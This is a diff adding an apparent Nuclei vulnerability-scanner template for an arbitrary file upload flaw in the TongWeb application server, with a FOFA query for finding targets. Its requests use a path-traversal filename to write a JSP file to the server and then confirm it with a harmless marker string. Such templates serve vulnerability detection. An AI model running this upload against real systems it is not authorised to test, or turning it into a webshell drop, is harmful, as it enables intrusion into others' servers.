@@ -1,0 +1,44 @@
+id: Tongweb-deploy-upload
+
+info:
+  tags: Tongweb-deploy-upload
+  name: Tongweb-deploy-upload 任意文件上传漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa: Dongfang - Application Server Tongweb
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /heimdall/deploy/upload?method=upload HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
+        Connection: keep-alive
+        Content-Length: 396
+        Accept: */*
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
+
+        ------WebKitFormBoundary8UaANmWAgM4BqBSsContent-Disposition: form-data; name="file"; filename="../../applications/console/css/{{username}}.jsp"
+
+        12300456
+        ------WebKitFormBoundary8UaANmWAgM4BqBSs--
+
+  - raw:
+      - |
+        GET /{{username}}.jsp HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '12300456'
+      - type: status
+        status: 
+          - 200
